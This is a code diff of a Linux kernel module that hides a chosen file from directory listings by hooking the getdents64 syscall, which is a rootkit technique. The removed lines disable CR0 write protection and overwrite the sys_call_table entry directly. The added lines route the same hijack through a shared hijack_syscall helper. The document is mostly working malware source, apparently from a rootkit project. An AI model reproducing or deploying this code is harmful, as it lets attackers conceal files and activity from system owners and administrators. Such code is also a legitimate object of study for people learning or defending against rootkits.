@@ -1,32 +1,17 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include <linux/kallsyms.h>
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 #include <stdbool.h>
+#include "../common/syscall_hijacking/syscall_hijack.h"
 
 // Types & other consts.
-static char *file_name_to_hide;
+static char *file_name_to_hide = NULL;
 module_param(file_name_to_hide, charp, 0600);
 
 typedef int (*original_getdents64_t)(const struct pt_regs *regs);
 static original_getdents64_t original_getdents64_ptr;
-static unsigned long *syscall_table; 
- 
-static inline void wp_cr0(unsigned long val) {
-    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
-}
-
-static inline void disable_write_protect(void) {
-    printk(KERN_ALERT "Disabling write protect!");
-    wp_cr0(read_cr0() & (~0x10000));
-}
-
-static inline void enable_write_protect(void) {
-    printk(KERN_ALERT "Enabling write protect...");
-    wp_cr0(read_cr0() | 0x10000);
-}
 
 int new_getdents64(const struct pt_regs *regs) {
     int total_bytes_read = original_getdents64_ptr(regs);
@@ -73,18 +58,18 @@ int new_getdents64(const struct pt_regs *regs) {
 }
  
 int load(void) {
+    printk(KERN_ALERT "Initializing...");
     if (file_name_to_hide == NULL) {
         printk(KERN_ALERT "File name to hide has not been set! Exiting...");
         return -1;
     }
 
-    printk(KERN_ALERT "Initializing...");
-    disable_write_protect();
-    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
-    original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
-    syscall_table[__NR_getdents64] = (unsigned long)new_getdents64;
-    printk(KERN_ALERT "Overrided getdents64 ptr!");
-    enable_write_protect();
+    unsigned long getdents_ptr = hijack_syscall(__NR_getdents64, (unsigned long)new_getdents64);
+    if (!getdents_ptr) {
+        return -1;
+    }
+    
+    original_getdents64_ptr = (original_getdents64_t)getdents_ptr;
     printk(KERN_ALERT "Initialized successfuly!");
 
     return 0;
@@ -92,10 +77,7 @@ int load(void) {
  
 void unload(void) {
     printk(KERN_ALERT "Shutting down.");
-    disable_write_protect();
-    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64_ptr;  
-    printk(KERN_ALERT "getdents64 has been restored!");
-    enable_write_protect();
+    restore_syscall(__NR_getdents64, (unsigned long)original_getdents64_ptr);
     printk(KERN_ALERT "Goodbye world...");
 }
 
